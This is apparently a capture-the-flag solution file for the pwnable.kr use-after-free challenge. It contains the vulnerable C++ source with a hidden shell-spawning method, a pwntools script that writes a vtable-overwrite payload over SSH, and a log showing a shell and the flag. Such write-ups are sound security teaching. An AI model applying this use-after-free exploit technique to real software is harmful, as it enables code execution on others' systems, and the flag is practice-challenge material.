'''

Description:

    Mommy, what is Use After Free bug?
    
    ssh uaf@pwnable.kr -p2222 (pw:guest)
    
Source of uaf.cpp:

    #include <fcntl.h>
    #include <iostream> 
    #include <cstring>
    #include <cstdlib>
    #include <unistd.h>
    using namespace std;
    
    class Human{
        private:
            virtual void give_shell(){
                system("/bin/sh");
            }
        protected:
            int age;
            string name;
        public:
            virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
            }
    };
    
    class Man: public Human{
        public:
            Man(string name, int age){
                this->name = name;
                this->age = age;
            }            
            virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
            }
    };
    
    class Woman: public Human{
        public:
            Woman(string name, int age){
                this->name = name;
                this->age = age;
            }
            virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
            }
    };
    
    int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);
        
        size_t len;
        char* data;
        unsigned int op;
        while(1){
            cout << "1. use\n2. after\n3. free\n";
            cin >> op;
            
            switch(op){
                case 1:
                    m->introduce();
                    w->introduce();
                    break;
                case 2:
                    len = atoi(argv[1]);
                    data = new char[len];
                    read(open(argv[2], O_RDONLY), data, len);
                    cout << "your data is allocated" << endl;
                    break;
                case 3:
                    delete m;
                    delete w;
                    break;
                default:
                    break;
            }
        }
        
        return 0;
    }

Solution

Solver:
'''

from pwn import *

user    = 'uaf'
passwd  = 'guest'
host    = 'pwnable.kr'
port    = 2222
command = '''
cd /tmp; echo -e "\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00BBBBBBBCCCCCCCC" > uaf_exploit.txt;
'''

s = ssh(user, host, port, passwd)
s.run_to_end(command)
s.interactive()
s.close()

'''
Log:

Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: None: Done
[*] Switching to interactive mode
uaf@ubuntu:~$ ./uaf 24 /tmp/uaf_exploit.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning
$ exit
$ exit
1. use
2. after
3. free
^C
uaf@ubuntu:~$ exit
logout
[*] Got EOF while reading in interactive
[*] Closed SSH channel with pwnable.kr
[*] Closed connection to 'pwnable.kr'
'''
